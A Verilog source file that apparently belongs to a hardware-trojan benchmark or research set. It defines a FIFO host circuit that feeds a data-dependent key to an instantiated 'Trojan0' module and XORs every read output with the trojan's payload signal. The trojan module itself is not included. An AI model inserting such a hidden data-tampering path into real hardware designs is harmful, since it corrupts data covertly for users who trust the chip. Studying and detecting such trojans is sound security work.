// FIFO Host Circuit for Trojan0
// Fixed I/O to match Trojan0: key[127:0] -> load[63:0]
module trojan0_fifo_host #(
    parameter DATA_WIDTH = 32,   // FIFO data width
    parameter DEPTH = 32,        // FIFO depth (power of 2)
    parameter ADDR_WIDTH = 5,    // log2(DEPTH)
    parameter [127:0] KEY_INIT = 128'hF1F00123456789ABCDEFF1F0F1F0F1F0  // FIFO key seed
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] write_data,
    input wire write_enable,
    input wire read_enable,
    output reg [DATA_WIDTH-1:0] read_data,
    output reg fifo_full,
    output reg fifo_empty,
    output reg fifo_overflow,
    output reg fifo_underflow
);

    // Trojan interface (fixed width)
    wire [127:0] trojan_key;
    wire [63:0] trojan_load;
    
    // FIFO structure
    reg [DATA_WIDTH-1:0] fifo_mem [0:DEPTH-1];
    reg [ADDR_WIDTH:0] write_ptr;  // Extra bit for full/empty detection
    reg [ADDR_WIDTH:0] read_ptr;   // Extra bit for full/empty detection
    reg [127:0] key_generator;
    reg [ADDR_WIDTH:0] fifo_count;
    
    // Key generation for trojan
    always @(posedge clk or posedge rst) begin
        if (rst)
            key_generator <= KEY_INIT;
        else if (write_enable || read_enable)
            key_generator <= {key_generator[119:0], key_generator[127:120] ^ write_data[7:0]};
    end
    
    assign trojan_key = key_generator;
    
    // FIFO status flags
    always @(*) begin
        fifo_full = (fifo_count == DEPTH);
        fifo_empty = (fifo_count == {ADDR_WIDTH+1{1'b0}});
    end
    
    // FIFO counter
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_count <= {ADDR_WIDTH+1{1'b0}};
        end else begin
            case ({write_enable & ~fifo_full, read_enable & ~fifo_empty})
                2'b10: fifo_count <= fifo_count + 1;  // Write only
                2'b01: fifo_count <= fifo_count - 1;  // Read only
                2'b11: fifo_count <= fifo_count;      // Read and write
                default: fifo_count <= fifo_count;    // No operation
            endcase
        end
    end
    
    // Write pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            write_ptr <= {ADDR_WIDTH+1{1'b0}};
        end else if (write_enable && !fifo_full) begin
            write_ptr <= write_ptr + 1;
        end
    end
    
    // Read pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_ptr <= {ADDR_WIDTH+1{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            read_ptr <= read_ptr + 1;
        end
    end
    
    // FIFO write operation
    always @(posedge clk) begin
        if (write_enable && !fifo_full) begin
            fifo_mem[write_ptr[ADDR_WIDTH-1:0]] <= write_data;
        end
    end
    
    // FIFO read operation with trojan load integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_data <= {DATA_WIDTH{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            // Mix read data with trojan load
            read_data <= fifo_mem[read_ptr[ADDR_WIDTH-1:0]] ^ trojan_load[DATA_WIDTH-1:0];
        end
    end
    
    // Error flag management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_overflow <= 1'b0;
            fifo_underflow <= 1'b0;
        end else begin
            fifo_overflow <= write_enable && fifo_full;
            fifo_underflow <= read_enable && fifo_empty;
        end
    end
    
    // Initialize FIFO memory
    integer i;
    always @(posedge rst) begin
        if (rst) begin
            for (i = 0; i < DEPTH; i = i + 1) begin
                fifo_mem[i] <= {DATA_WIDTH{1'b0}};
            end
        end
    end
    
    // Instantiate Trojan0
    Trojan0 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .load(trojan_load)
    );

endmodule
